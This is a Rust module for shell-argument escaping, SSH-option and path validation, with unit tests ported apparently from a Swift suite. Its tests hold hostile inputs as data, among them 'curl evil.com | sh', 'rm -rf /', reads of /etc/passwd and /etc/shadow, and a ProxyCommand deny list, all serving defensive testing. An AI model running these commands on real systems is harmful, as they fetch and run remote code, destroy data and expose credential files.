//! Safe shell argument escaping and input validation.
//!
//! Port of `ShellEscaping.swift` from `apps/chau7-macos/Sources/Chau7Core`.
//! Use these to prevent command injection vulnerabilities.

/// Escapes a string for safe use as a shell argument by wrapping it in single
/// quotes. An embedded single quote ends the quoted string, adds an escaped
/// quote, then starts a new quoted string: `'foo'\''bar'` is `foo'bar`.
pub fn escape_argument(argument: &str) -> String {
    format!("'{}'", argument.replace('\'', "'\\''"))
}

/// Escapes a file path for safe use in shell commands.
pub fn escape_path(path: &str) -> String {
    escape_argument(path)
}

/// Escapes multiple arguments and joins them with spaces.
pub fn escape_arguments<S: AsRef<str>>(arguments: &[S]) -> String {
    arguments
        .iter()
        .map(|a| escape_argument(a.as_ref()))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Characters that have special meaning in shell and require escaping.
pub const SHELL_METACHARACTERS: [char; 23] = [
    ' ', '\t', '\n', '"', '\'', '`', '$', '\\', '!', '&', '|', ';', '(', ')', '<', '>', '*', '?',
    '[', ']', '#', '~', '^',
];

/// Checks if a string contains shell metacharacters that need escaping.
pub fn contains_metacharacters(string: &str) -> bool {
    string.chars().any(|c| SHELL_METACHARACTERS.contains(&c))
}

/// Checks if a string is a safe identifier (alphanumeric, underscore, hyphen,
/// dot). Safe identifiers don't need escaping in most contexts.
pub fn is_safe_identifier(string: &str) -> bool {
    !string.is_empty()
        && string
            .chars()
            .all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | '.'))
}

/// Why an SSH options string was rejected.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SshValidationIssue {
    DangerousOption(String),
    CommandSubstitution,
    ShellRedirection,
    ShellControlChars,
}

/// Outcome of [`validate_ssh_options`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshValidationResult {
    pub is_valid: bool,
    pub issue: Option<SshValidationIssue>,
}

impl SshValidationResult {
    fn valid() -> Self {
        Self {
            is_valid: true,
            issue: None,
        }
    }

    fn invalid(issue: SshValidationIssue) -> Self {
        Self {
            is_valid: false,
            issue: Some(issue),
        }
    }
}

/// Dangerous SSH options that could be used for command injection or
/// exfiltration.
pub const DANGEROUS_SSH_OPTIONS: [&str; 7] = [
    "-o ProxyCommand", // Can execute arbitrary commands
    "-o LocalCommand", // Can execute local commands
    "-o PermitLocalCommand",
    "-W", // Stdio forwarding
    "ProxyCommand",
    "LocalCommand",
    "PermitLocalCommand",
];

/// Validates SSH extra options from user input.
pub fn validate_ssh_options(options: &str) -> SshValidationResult {
    let trimmed = options.trim();

    if trimmed.is_empty() {
        return SshValidationResult::valid();
    }

    // Dangerous options (case-insensitive).
    let lowercased = trimmed.to_lowercase();
    if let Some(dangerous) = DANGEROUS_SSH_OPTIONS
        .iter()
        .find(|d| lowercased.contains(&d.to_lowercase()))
    {
        return SshValidationResult::invalid(SshValidationIssue::DangerousOption(
            (*dangerous).to_string(),
        ));
    }

    if trimmed.contains("$(") || trimmed.contains('`') {
        return SshValidationResult::invalid(SshValidationIssue::CommandSubstitution);
    }

    if trimmed.contains(['>', '<', '|']) {
        return SshValidationResult::invalid(SshValidationIssue::ShellRedirection);
    }

    if trimmed.contains([';', '&', '\n', '\r']) {
        return SshValidationResult::invalid(SshValidationIssue::ShellControlChars);
    }

    SshValidationResult::valid()
}

/// Validates a file path for safety: non-empty after trimming, no NUL bytes,
/// no command substitution, and no `..` components.
pub fn is_valid_path(path: &str) -> bool {
    let trimmed = path.trim();

    if trimmed.is_empty() {
        return false;
    }
    if trimmed.contains('\0') {
        return false;
    }
    if trimmed.contains("$(") || trimmed.contains('`') {
        return false;
    }
    !trimmed.split('/').any(|c| c == "..")
}

/// Sanitizes a path by removing NUL bytes, command substitution markers and
/// `..` components.
pub fn sanitize_path(path: &str) -> String {
    let result = path
        .trim()
        .replace('\0', "")
        .replace("$(", "")
        .replace('`', "");

    result
        .split('/')
        .filter(|c| *c != "..")
        .collect::<Vec<_>>()
        .join("/")
}

/// Checks if an environment variable name is valid: a letter or underscore
/// followed by letters, numbers or underscores.
pub fn is_valid_env_var_name(name: &str) -> bool {
    let mut chars = name.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first.is_alphabetic() || first == '_') {
        return false;
    }
    chars.all(|c| c.is_alphabetic() || c.is_numeric() || c == '_')
}

/// Builds a shell-safe environment assignment prefix (`KEY='value'` joined by
/// spaces), sorted by key and dropping invalid variable names.
pub fn escape_environment_assignments<I, K, V>(environment: I) -> String
where
    I: IntoIterator<Item = (K, V)>,
    K: AsRef<str>,
    V: AsRef<str>,
{
    let mut entries: Vec<(K, V)> = environment.into_iter().collect();
    entries.sort_by(|a, b| a.0.as_ref().cmp(b.0.as_ref()));
    entries
        .iter()
        .filter(|(key, _)| is_valid_env_var_name(key.as_ref()))
        .map(|(key, value)| format!("{}={}", key.as_ref(), escape_argument(value.as_ref())))
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    // Ported from ShellEscapingTests.swift. No tests skipped.
    use super::*;

    // Argument escaping

    #[test]
    fn escape_simple_argument() {
        assert_eq!(escape_argument("hello"), "'hello'");
    }

    #[test]
    fn escape_argument_with_spaces() {
        assert_eq!(escape_argument("hello world"), "'hello world'");
    }

    #[test]
    fn escape_argument_with_single_quote() {
        assert_eq!(escape_argument("it's"), "'it'\\''s'");
    }

    #[test]
    fn escape_argument_with_multiple_single_quotes() {
        assert_eq!(escape_argument("'test'"), "''\\''test'\\'''");
    }

    #[test]
    fn escape_argument_with_double_quotes() {
        assert_eq!(escape_argument("say \"hello\""), "'say \"hello\"'");
    }

    #[test]
    fn escape_argument_with_dollar_sign() {
        assert_eq!(escape_argument("$HOME"), "'$HOME'");
    }

    #[test]
    fn escape_argument_with_backticks() {
        assert_eq!(escape_argument("`whoami`"), "'`whoami`'");
    }

    #[test]
    fn escape_argument_with_newline() {
        assert_eq!(escape_argument("line1\nline2"), "'line1\nline2'");
    }

    #[test]
    fn escape_empty_argument() {
        assert_eq!(escape_argument(""), "''");
    }

    #[test]
    fn escape_path_with_spaces() {
        assert_eq!(
            escape_path("/path/with spaces/file.txt"),
            "'/path/with spaces/file.txt'"
        );
    }

    #[test]
    fn escape_multiple_arguments() {
        assert_eq!(
            escape_arguments(&["echo", "hello world", "$var"]),
            "'echo' 'hello world' '$var'"
        );
    }

    // Metacharacter detection

    #[test]
    fn contains_metacharacters_space() {
        assert!(contains_metacharacters("hello world"));
    }

    #[test]
    fn contains_metacharacters_dollar() {
        assert!(contains_metacharacters("$HOME"));
    }

    #[test]
    fn contains_metacharacters_backtick() {
        assert!(contains_metacharacters("`cmd`"));
    }

    #[test]
    fn contains_metacharacters_pipe() {
        assert!(contains_metacharacters("cmd | grep"));
    }

    #[test]
    fn contains_metacharacters_semicolon() {
        assert!(contains_metacharacters("cmd; rm -rf"));
    }

    #[test]
    fn contains_metacharacters_clean() {
        assert!(!contains_metacharacters("hello"));
        assert!(!contains_metacharacters("file.txt"));
        assert!(!contains_metacharacters("path/to/file"));
    }

    // Safe identifiers

    #[test]
    fn is_safe_identifier_simple() {
        assert!(is_safe_identifier("hello"));
        assert!(is_safe_identifier("Hello123"));
        assert!(is_safe_identifier("my_var"));
        assert!(is_safe_identifier("file-name"));
        assert!(is_safe_identifier("config.json"));
    }

    #[test]
    fn is_safe_identifier_unsafe() {
        assert!(!is_safe_identifier("hello world"));
        assert!(!is_safe_identifier("$var"));
        assert!(!is_safe_identifier("cmd;rm"));
        assert!(!is_safe_identifier(""));
    }

    // SSH option validation

    #[test]
    fn validate_ssh_options_empty() {
        assert!(validate_ssh_options("").is_valid);
    }

    #[test]
    fn validate_ssh_options_safe_options() {
        assert!(validate_ssh_options("-v").is_valid);
        assert!(validate_ssh_options("-o StrictHostKeyChecking=no").is_valid);
        assert!(validate_ssh_options("-o UserKnownHostsFile=/dev/null").is_valid);
        assert!(validate_ssh_options("-A").is_valid);
    }

    #[test]
    fn validate_ssh_options_proxy_command() {
        let result = validate_ssh_options("-o ProxyCommand=nc %h %p");
        assert!(!result.is_valid);
        let Some(SshValidationIssue::DangerousOption(option)) = result.issue else {
            panic!("Expected dangerous option issue");
        };
        assert!(option.contains("ProxyCommand"));
    }

    #[test]
    fn validate_ssh_options_local_command() {
        assert!(!validate_ssh_options("-o LocalCommand=whoami").is_valid);
    }

    #[test]
    fn validate_ssh_options_command_substitution() {
        let result1 = validate_ssh_options("-v $(whoami)");
        assert!(!result1.is_valid);
        assert_eq!(result1.issue, Some(SshValidationIssue::CommandSubstitution));

        let result2 = validate_ssh_options("-v `id`");
        assert!(!result2.is_valid);
        assert_eq!(result2.issue, Some(SshValidationIssue::CommandSubstitution));
    }

    #[test]
    fn validate_ssh_options_redirection() {
        assert!(!validate_ssh_options("-v > /tmp/log").is_valid);
        assert!(!validate_ssh_options("-v | grep").is_valid);
        assert!(!validate_ssh_options("-v < input").is_valid);
    }

    #[test]
    fn validate_ssh_options_shell_control_characters() {
        assert!(!validate_ssh_options("-v; rm -rf /").is_valid);
        assert!(!validate_ssh_options("-v && whoami").is_valid);
        assert!(!validate_ssh_options("-v \nwhoami").is_valid);
    }

    // Path validation

    #[test]
    fn is_valid_path_simple() {
        assert!(is_valid_path("~/test/file.txt"));
        assert!(is_valid_path("~/Documents/file"));
        assert!(is_valid_path("./relative/path"));
    }

    #[test]
    fn is_valid_path_empty() {
        assert!(!is_valid_path(""));
        assert!(!is_valid_path("   "));
    }

    #[test]
    fn is_valid_path_null_byte() {
        assert!(!is_valid_path("/path/with\0null"));
    }

    #[test]
    fn is_valid_path_command_substitution() {
        assert!(!is_valid_path("/path/$(whoami)/file"));
        assert!(!is_valid_path("/path/`id`/file"));
    }

    #[test]
    fn sanitize_path_basic() {
        assert_eq!(sanitize_path("  /path/file  "), "/path/file");
        assert_eq!(sanitize_path("/path/$(rm -rf)/file"), "/path/rm -rf)/file");
        assert_eq!(sanitize_path("/path/`id`/file"), "/path/id/file");
    }

    // Environment variable names

    #[test]
    fn is_valid_env_var_name_valid() {
        assert!(is_valid_env_var_name("HOME"));
        assert!(is_valid_env_var_name("PATH"));
        assert!(is_valid_env_var_name("MY_VAR"));
        assert!(is_valid_env_var_name("_PRIVATE"));
        assert!(is_valid_env_var_name("var123"));
    }

    #[test]
    fn is_valid_env_var_name_invalid() {
        assert!(!is_valid_env_var_name(""));
        assert!(!is_valid_env_var_name("123VAR"));
        assert!(!is_valid_env_var_name("MY-VAR"));
        assert!(!is_valid_env_var_name("MY VAR"));
        assert!(!is_valid_env_var_name("$VAR"));
    }

    // Real-world attack patterns

    #[test]
    fn escape_command_injection_attempt() {
        let attacks = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com | sh",
            "$(curl evil.com)",
            "`curl evil.com`",
            "'; DROP TABLE users; --",
        ];

        for attack in attacks {
            let escaped = escape_argument(attack);
            assert!(escaped.starts_with('\''), "Attack '{attack}' not escaped");
            assert!(escaped.ends_with('\''), "Attack '{attack}' not escaped");
        }
    }

    #[test]
    fn escape_path_traversal() {
        assert_eq!(escape_path("../../../etc/passwd"), "'../../../etc/passwd'");
    }

    // Path traversal validation

    #[test]
    fn is_valid_path_rejects_parent_traversal() {
        assert!(!is_valid_path("../../etc/passwd"));
        assert!(!is_valid_path("/home/../etc/shadow"));
        assert!(!is_valid_path("foo/../bar"));
        assert!(!is_valid_path("/tmp/safe/../../etc/passwd"));
    }

    #[test]
    fn is_valid_path_allows_single_dot() {
        assert!(is_valid_path("./relative/path"));
        assert!(is_valid_path("/path/./to/file"));
    }

    #[test]
    fn sanitize_path_strips_parent_traversal() {
        let result = sanitize_path("../../etc/passwd");
        assert!(!result.contains(".."));
        assert!(result.contains("etc"));
    }

    #[test]
    fn sanitize_path_strips_embedded_traversal() {
        assert!(!sanitize_path("/home/../etc/shadow").contains(".."));
    }

    // Extra coverage (not in the Swift suite).

    #[test]
    fn escape_environment_assignments_sorts_and_drops_invalid_keys() {
        let env = [("B", "two words"), ("A", "it's"), ("BAD-KEY", "x")];
        assert_eq!(
            escape_environment_assignments(env),
            "A='it'\\''s' B='two words'"
        );
    }
}
